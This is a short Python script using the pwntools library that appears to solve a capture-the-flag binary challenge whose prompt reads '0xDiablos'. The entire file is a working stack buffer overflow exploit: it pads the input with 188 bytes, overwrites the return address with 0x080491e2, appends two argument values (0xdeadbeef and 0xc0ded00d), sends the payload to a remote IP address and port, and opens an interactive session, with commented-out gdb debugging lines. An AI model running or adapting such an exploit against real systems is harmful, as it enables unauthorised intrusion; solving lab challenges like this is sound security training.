#!/usr/bin/python3
import pwn
#e = pwn.context.binary = pwn.ELF("./vuln")
#p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
#    +"\nbreak *0x08049243"
#    +"\nc"
#)

#p = e.process()
p = pwn.connect("83.136.254.199","41637")
p.recvuntil("0xDiablos: ")

payload=b"A"*188
payload+=pwn.p32(0x080491e2)
payload+=b"C"*4



#payload1=b"\xef\xbe\xad\xde"

payload += pwn.p32(0xdeadbeef)

#payload+=b"\x0d\xd0\xde\xc0"
payload += pwn.p32(0xc0ded00d)
payload+=b"A"*200
p.sendline(payload)



p.interactive()


